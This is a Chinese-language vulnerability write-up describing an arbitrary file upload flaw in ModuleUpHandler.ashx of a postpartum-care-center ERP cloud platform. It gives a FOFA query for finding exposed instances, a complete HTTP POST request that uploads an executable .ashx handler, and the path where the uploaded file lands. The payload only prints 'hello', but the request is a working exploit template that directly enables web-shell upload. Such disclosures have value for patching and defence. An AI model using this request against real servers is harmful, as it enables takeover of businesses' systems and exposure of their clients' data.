# 月子会所ERP管理云平台ModuleUpHandler任意文件上传漏洞

# <font style="color:#080808;background-color:#ffffff;">一、漏洞简介</font>
<font style="color:#080808;background-color:#ffffff;">月子会ERP管理云平台是由武汉金同方科技有限公司研发团队结合行业月子中心相关企业需求开发的一套综合性管理软件，管控月子中心经营过程中各个环节。由于未对上传文件进行任何过滤，可上传任意文件，攻击者可利用该漏洞获取服务器控制权。</font>

# <font style="color:#080808;background-color:#ffffff;">二、影响版本</font>
+ <font style="color:#080808;background-color:#ffffff;">月子会所ERP管理云平台</font>

# <font style="color:#080808;background-color:#ffffff;">三、资产测绘</font>
+ fofa`product="妈妈宝盒-ERP"`
+ 登录页面

![1693185375907-6915a126-7596-4142-b75c-f6a9c41760ab.png](./img/3mmUwcgCCPX7rs7K/1693185375907-6915a126-7596-4142-b75c-f6a9c41760ab-679198.png)

# <font style="color:#080808;background-color:#ffffff;">四、漏洞复现</font>
```plain
POST /Page/upload/ModuleUpHandler.ashx HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_301
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 497
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.ashx"

<% @ webhandler language="C#" class="AverageHandler" %> 
using System; 
using System.Web; 

public class AverageHandler : IHttpHandler 
{ 
    public bool IsReusable 
    { 
        get {
             return true; 
            } 
        } 
        public void ProcessRequest(HttpContext ctx) 
        { 
            ctx.Response.Write("hello"); 
        } 
    }
--00content0boundary00--

```

 ![1695625113023-1b5a561e-bca9-4e0b-a851-54e37976b1b6.png](./img/3mmUwcgCCPX7rs7K/1695625113023-1b5a561e-bca9-4e0b-a851-54e37976b1b6-397424.png)

上传文件位置

```plain
/UploadBaseFolder/ERP/202309//202309250657582615379.ashx
```

![1695625148156-b4baa984-634d-4344-aefe-4d61c36a3e6c.png](./img/3mmUwcgCCPX7rs7K/1695625148156-b4baa984-634d-4344-aefe-4d61c36a3e6c-987654.png)



> 更新: 2024-02-29 23:55:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/sxm2rg6f8psodrnd>